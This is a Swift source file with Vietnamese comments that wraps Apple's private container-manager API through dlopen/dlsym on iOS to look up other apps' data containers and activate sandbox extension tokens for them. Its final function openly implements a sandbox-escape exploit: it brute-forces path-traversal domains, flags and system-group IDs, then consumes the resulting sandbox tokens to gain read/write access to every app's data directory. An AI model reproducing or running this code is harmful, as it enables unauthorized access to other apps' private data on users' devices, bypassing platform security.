import Foundation
import Darwin

public enum MCMError: Error, LocalizedError, CustomStringConvertible {
    case dlopenFailed
    case symbolNotFound(String)
    case queryFailed(String)
    case objectFailed(String)
    case activationFailed(Int32)

    public var description: String {
        switch self {
        case .dlopenFailed:
            return "Không thể nạp libsystem_containermanager.dylib"
        case .symbolNotFound(let s):
            return "Không tìm thấy hàm: \(s)"
        case .queryFailed(let m):
            return "Truy vấn container thất bại: \(m)"
        case .objectFailed(let m):
            return "Container object thất bại: \(m)"
        case .activationFailed(let e):
            return "Kích hoạt sandbox extension thất bại (errno=\(e))"
        }
    }

    public var errorDescription: String? { description }
}

public enum MCMContainerClass: UInt32 {
    case system = 1
    case data = 2
    case pluginData = 3
    case bundle = 4
    case sharedData = 5
    case temp = 6
    case group = 7
    case systemGroup = 13
}

public final class MCMContainer {
    public typealias Query = OpaquePointer
    public typealias Object = OpaquePointer
    public typealias ErrorRef = OpaquePointer

    public static let shared: MCMContainer? = {
        try? MCMContainer()
    }()

    public var isLoaded: Bool {
        handle != nil && fns != nil
    }

    private let handle: UnsafeMutableRawPointer?
    private let fns: Fns?

    /// Lease giống MCMActiveLeases của app tham chiếu: giữ object copy đã
    /// activate SỐNG để sandbox extension không bị thu hồi. Key = "cls:identifier".
    private var leases: [String: Object] = [:]
    private let leaseLock = NSLock()

    private struct Fns {
        let create: @convention(c) () -> Query?
        let setClass: @convention(c) (Query?, UInt64) -> Void
        let setIdentifiers: @convention(c) (Query?, OpaquePointer?) -> Void
        let setGroupIdentifiers: @convention(c) (Query?, OpaquePointer?) -> Void
        let setFlags: @convention(c) (Query?, UInt64) -> Void
        let setPart: @convention(c) (Query?, UInt64) -> Void
        let setPartDomain: @convention(c) (Query?, UnsafePointer<CChar>?) -> Void
        let getSingleResult: @convention(c) (Query?) -> Object?
        let getLastError: @convention(c) (Query?) -> ErrorRef?
        let iterateResultsSync: @convention(c) (Query?, @convention(block) (Object?) -> Bool) -> Bool
        let free: @convention(c) (Query?) -> Void
        let objectGetPath: @convention(c) (Object?) -> UnsafePointer<CChar>?
        let objectGetIdentifier: @convention(c) (Object?) -> UnsafePointer<CChar>?
        let objectCopy: @convention(c) (Object?) -> Object?
        let copySandboxToken: @convention(c) (Object?) -> UnsafeMutablePointer<CChar>?
        let sandboxExtensionActivate: @convention(c) (Object?, Bool) -> Bool
        let objectFree: @convention(c) (Object?) -> Void
        let errorGetPosixErrno: @convention(c) (ErrorRef?) -> Int32
        let errorGetMessage: @convention(c) (ErrorRef?) -> UnsafePointer<CChar>?
        let xpcStringCreate: @convention(c) (UnsafePointer<CChar>?) -> OpaquePointer?
        let xpcRelease: @convention(c) (OpaquePointer?) -> Void
    }

    public init() throws {
        // iOS 18+ đổi vị trí dylib -> thử nhiều path, log dlerror để chẩn đoán
        let candidates = [
            "/usr/lib/system/libsystem_containermanager.dylib",
            "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
            "/usr/lib/libMobileContainerManager.dylib"
        ]
        var h: UnsafeMutableRawPointer? = nil
        var lastErr = ""
        for p in candidates {
            if let hh = dlopen(p, RTLD_LAZY) { h = hh; break }
            if let e = dlerror() { lastErr = String(cString: e) }
        }
        guard let handleUnwrapped = h else {
            ContainerAccess.diag("MCM dlopen fail: \(lastErr)")
            throw MCMError.dlopenFailed
        }
        let hUnwrapped = handleUnwrapped
        handle = hUnwrapped

        func sym<T>(_ name: String) throws -> T {
            guard let p = dlsym(hUnwrapped, name) else { throw MCMError.symbolNotFound(name) }
            return unsafeBitCast(p, to: T.self)
        }
        // xpc_* nằm trong libxpc riêng trên iOS 18, không dùng RTLD_DEFAULT
        let xpcHandle: UnsafeMutableRawPointer? = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY)
        func symGlobal<T>(_ name: String) throws -> T {
            if let xh = xpcHandle, let p = dlsym(xh, name) {
                return unsafeBitCast(p, to: T.self)
            }
            guard let p = dlsym(UnsafeMutableRawPointer(bitPattern: -2), name) else { throw MCMError.symbolNotFound(name) }
            return unsafeBitCast(p, to: T.self)
        }

        let resolved = Fns(
            create: try sym("container_query_create"),
            setClass: try sym("container_query_set_class"),
            setIdentifiers: try sym("container_query_set_identifiers"),
            setGroupIdentifiers: try sym("container_query_set_group_identifiers"),
            setFlags: try sym("container_query_operation_set_flags"),
            setPart: try sym("container_query_operation_set_part"),
            setPartDomain: try sym("container_query_operation_set_part_domain"),
            getSingleResult: try sym("container_query_get_single_result"),
            getLastError: try sym("container_query_get_last_error"),
            iterateResultsSync: try sym("container_query_iterate_results_sync"),
            free: try sym("container_query_free"),
            objectGetPath: try sym("container_object_get_path"),
            objectGetIdentifier: try sym("container_object_get_identifier"),
            objectCopy: try sym("container_object_copy"),
            copySandboxToken: try sym("container_copy_sandbox_token"),
            sandboxExtensionActivate: try sym("container_object_sandbox_extension_activate"),
            objectFree: try sym("container_object_free"),
            errorGetPosixErrno: try sym("container_error_get_posix_errno"),
            errorGetMessage: try sym("container_error_get_message"),
            xpcStringCreate: try symGlobal("xpc_string_create"),
            xpcRelease: try symGlobal("xpc_release")
        )
        fns = resolved
    }

    private func errorText(_ e: ErrorRef?) -> String {
        guard let e = e else { return "unknown" }
        guard let fns = fns else { return "errno unknown" }
        if let msg = fns.errorGetMessage(e) {
            return String(cString: msg)
        }
        return "errno=\(fns.errorGetPosixErrno(e))"
    }

    /// Chuẩn hóa path giống app tham chiếu: "/var" → "/private/var".
    private func normalizePath(_ path: String) -> String {
        if path == "/var" || path.hasPrefix("/var/") {
            return "/private" + path
        }
        return path
    }

    /// Kích hoạt sandbox extension theo ĐÚNG app tham chiếu: objectCopy → copySandboxToken (kiểm tra token rỗng) →
    /// free(token) → objectActivate(copy, false).
    /// Object gốc thuộc query — KHÔNG được free ở đây.
    private func activateSandboxExtension(on object: Object, key: String) throws {
        guard let fns = fns else { throw MCMError.dlopenFailed }
        guard let copy = fns.objectCopy(object) else {
            throw MCMError.objectFailed("copy")
        }

        var directConsumed = false
        if let tokenPtr = fns.copySandboxToken(copy) {
            defer { free(tokenPtr) }
            if tokenPtr.pointee != 0 {
                // Direct kernel sandbox extension consume qua libsystem_sandbox
                let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
                if let sbHandle = sandboxHandle,
                   let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
                    typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
                    let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
                    let handle = consume(tokenPtr)
                    if handle >= 0 {
                        directConsumed = true
                        Self.consumedSandboxTokens.append(handle)
                        ContainerAccess.diag("[SBX] ✅ sandbox_extension_consume thành công (handle=\(handle))")
                    }
                }
            }
        }

        let ok = fns.sandboxExtensionActivate(copy, false)
        if ok {
            ContainerAccess.diag("[SBX] ✅ MCM sandboxExtensionActivate thành công")
        } else if !directConsumed {
            fns.objectFree(copy)
            throw MCMError.activationFailed(errno)
        }

        // Giữ copy sống: thay lease cũ (nếu có) bằng lease mới.
        leaseLock.lock()
        if let old = leases[key] {
            fns.objectFree(old)
        }
        leases[key] = copy
        leaseLock.unlock()
    }

    public func containerPathBasic(
        forBundleID bundleID: String,
        identifier: String? = nil,
        cls: MCMContainerClass = .data,
        part: UInt64 = 0,
        activateExtension: Bool = true
    ) throws -> String {
        guard let fns = fns else { throw MCMError.dlopenFailed }

        guard let query = fns.create() else { throw MCMError.queryFailed("create") }
        defer { fns.free(query) }

        fns.setClass(query, UInt64(cls.rawValue))

        let id = identifier ?? bundleID
        guard let xpcID = fns.xpcStringCreate(id) else {
            throw MCMError.queryFailed("xpc_string_create")
        }
        defer { fns.xpcRelease(xpcID) }

        fns.setIdentifiers(query, xpcID)
        fns.setFlags(query, 0x900000000)
        fns.setPart(query, part)

        guard let obj = fns.getSingleResult(query) else {
            throw MCMError.queryFailed(errorText(fns.getLastError(query)))
        }

        guard let pathPtr = fns.objectGetPath(obj) else {
            throw MCMError.objectFailed("no path")
        }
        let path = normalizePath(String(cString: pathPtr))

        if activateExtension {
            do {
                try activateSandboxExtension(on: obj, key: "\(cls.rawValue):\(id)")
                ContainerAccess.diag("[SBX] ✅ Sandbox extension activated (basic) cho \(id)")
            } catch {
                ContainerAccess.diag("[SBX] ⚠️ Sandbox extension FAILED (basic) cho \(id): \(error.localizedDescription)")
            }
        }

        return path
    }

    public func containerPath(
        forBundleID bundleID: String,
        identifier: String? = nil,
        cls: MCMContainerClass = .data,
        part: UInt64 = 0,
        activateExtension: Bool = true
    ) throws -> String {
        guard let fns = fns else { throw MCMError.dlopenFailed }

        guard let query = fns.create() else { throw MCMError.queryFailed("create") }
        defer { fns.free(query) }

        fns.setClass(query, UInt64(cls.rawValue))

        let id = identifier ?? bundleID
        guard let xpcID = fns.xpcStringCreate(id) else {
            throw MCMError.queryFailed("xpc_string_create")
        }
        defer { fns.xpcRelease(xpcID) }

        fns.setIdentifiers(query, xpcID)
        fns.setFlags(query, 0x900000000)
        fns.setPart(query, part)

        let obj = fns.getSingleResult(query)

        if obj == nil {
            var iteratedPath: String? = nil
            let rc = fns.iterateResultsSync(query) { candidate in
                guard iteratedPath == nil, let candidate = candidate else { return true }
                guard let p = fns.objectGetPath(candidate) else { return true }
                iteratedPath = normalizePath(String(cString: p))
                if activateExtension {
                    do {
                        try activateSandboxExtension(on: candidate, key: "\(cls.rawValue):\(id)")
                        ContainerAccess.diag("[SBX] ✅ Sandbox extension activated (iterate) cho \(id)")
                    } catch {
                        ContainerAccess.diag("[SBX] ⚠️ Sandbox extension FAILED (iterate) cho \(id): \(error.localizedDescription)")
                    }
                }
                return true
            }
            if !rc {
                throw MCMError.queryFailed("iterate denied \(errorText(fns.getLastError(query)))")
            }
            guard let path = iteratedPath else {
                throw MCMError.queryFailed(errorText(fns.getLastError(query)))
            }
            return path
        }

        guard let obj = obj else { throw MCMError.queryFailed(errorText(fns.getLastError(query))) }
        guard let pathPtr = fns.objectGetPath(obj) else {
            throw MCMError.objectFailed("no path")
        }
        let path = normalizePath(String(cString: pathPtr))

        if activateExtension {
            do {
                try activateSandboxExtension(on: obj, key: "\(cls.rawValue):\(id)")
                ContainerAccess.diag("[SBX] ✅ Sandbox extension activated (advanced) cho \(id)")
            } catch {
                ContainerAccess.diag("[SBX] ⚠️ Sandbox extension FAILED (advanced) cho \(id): \(error.localizedDescription)")
            }
        }

        return path
    }

    public func sandboxToken(forBundleID bundleID: String) throws -> String {
        guard let fns = fns else { throw MCMError.dlopenFailed }

        guard let query = fns.create() else { throw MCMError.queryFailed("create") }
        defer { fns.free(query) }

        fns.setClass(query, UInt64(MCMContainerClass.data.rawValue))
        guard let xpcID = fns.xpcStringCreate(bundleID) else {
            throw MCMError.queryFailed("xpc_string_create")
        }
        defer { fns.xpcRelease(xpcID) }
        fns.setIdentifiers(query, xpcID)
        fns.setFlags(query, 0x900000000)
        fns.setPart(query, 0)

        guard let obj = fns.getSingleResult(query) else {
            throw MCMError.queryFailed(errorText(fns.getLastError(query)))
        }

        guard let tok = fns.copySandboxToken(obj) else {
            throw MCMError.objectFailed("no token")
        }
        let token = String(cString: tok)
        free(tok)
        return token
    }

    public func containerPathByIterating(
        forBundleID bundleID: String,
        cls: MCMContainerClass = .data
    ) throws -> String? {
        guard let fns = fns else { throw MCMError.dlopenFailed }

        guard let query = fns.create() else { throw MCMError.queryFailed("create") }
        defer { fns.free(query) }

        fns.setClass(query, UInt64(cls.rawValue))
        fns.setFlags(query, 0x100000000)
        fns.setPart(query, 0)

        var foundPath: String? = nil
        let rc = fns.iterateResultsSync(query) { current in
            guard let current = current, foundPath == nil else { return true }
            let ident: String? = {
                guard let p = fns.objectGetIdentifier(current) else { return nil }
                return String(cString: p)
            }()
            let path: String? = {
                guard let p = fns.objectGetPath(current) else { return nil }
                return String(cString: p)
            }()
            if ident == bundleID, let path = path {
                _ = try? activateSandboxExtension(on: current, key: "\(cls.rawValue):\(bundleID)")
                ContainerAccess.diag("[SBX] Sandbox extension (byIterating) cho \(bundleID)")
                foundPath = normalizePath(path)
                return false
            }
            return true
        }
        if !rc {
            throw MCMError.queryFailed("iterate denied \(errorText(fns.getLastError(query)))")
        }
        return foundPath
    }

    private static var consumedSandboxTokens: [Int64] = []

    /// Khai thác lỗ hổng MCM path traversal giống ThreeOneOSFive (3105)
    /// Trực tiếp escape sandbox để có quyền đọc ghi toàn bộ /private/var/mobile/Containers/Data/Application
    @discardableResult
    public func escapeSandboxViaSystemGroup() -> Bool {
        guard let fns = fns else { return false }
        
        let sysGroups = [
            "systemgroup.com.apple.mobilegestaltcache",
            "systemgroup.com.apple.configurationprofiles"
        ]
        
        let traversalPaths = [
            "../../../../../../../..",
            "../../../../../../../../..",
            "../../../../../../../../private/var/mobile/Containers/Data/Application"
        ]
        
        let flagCombos: [UInt64] = [0x900000000, 0x8000000000, 0x800000000, 0x100000000]
        let classes: [MCMContainerClass] = [.systemGroup, .group]
        let parts: [UInt64] = [3, 0]
        
        for sysGroupId in sysGroups {
            for cls in classes {
                for traversal in traversalPaths {
                    for flags in flagCombos {
                        for part in parts {
                            guard let query = fns.create() else { continue }
                            defer { fns.free(query) }
                            
                            fns.setClass(query, UInt64(cls.rawValue))
                            
                            guard let xpcID = fns.xpcStringCreate(sysGroupId) else { continue }
                            defer { fns.xpcRelease(xpcID) }
                            
                            fns.setIdentifiers(query, xpcID)
                            fns.setGroupIdentifiers(query, xpcID)
                            
                            traversal.withCString { domainPtr in
                                fns.setPartDomain(query, domainPtr)
                            }
                            
                            fns.setFlags(query, flags)
                            fns.setPart(query, part)
                            
                            guard let obj = fns.getSingleResult(query) else { continue }
                            
                            if let tokenPtr = fns.copySandboxToken(obj) {
                                defer { free(tokenPtr) }
                                if tokenPtr.pointee != 0 {
                                    let sandboxHandle = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_LAZY) ?? UnsafeMutableRawPointer(bitPattern: -2)
                                    if let sbHandle = sandboxHandle,
                                       let consumeSym = dlsym(sbHandle, "sandbox_extension_consume") {
                                        typealias ConsumeFn = @convention(c) (UnsafePointer<CChar>?) -> Int64
                                        let consume = unsafeBitCast(consumeSym, to: ConsumeFn.self)
                                        let handle = consume(tokenPtr)
                                        if handle >= 0 {
                                            Self.consumedSandboxTokens.append(handle)
                                            ContainerAccess.diag("[SBX] *** SANDBOX ESCAPED (R+W, handle=\(handle)) ***")
                                            return true
                                        }
                                    }
                                }
                            }
                            
                            if fns.sandboxExtensionActivate(obj, false) {
                                ContainerAccess.diag("[SBX] *** SANDBOX ACTIVATED via MCM ***")
                                return true
                            }
                        }
                    }
                }
            }
        }
        
        ContainerAccess.diag("[SBX] SystemGroup traversal query skipped or not needed")
        return false
    }

    deinit {
        if let fns = fns {
            leaseLock.lock()
            for (_, obj) in leases {
                fns.objectFree(obj)
            }
            leases.removeAll()
            leaseLock.unlock()
        }
        if let handle = handle {
            dlclose(handle)
        }
    }
}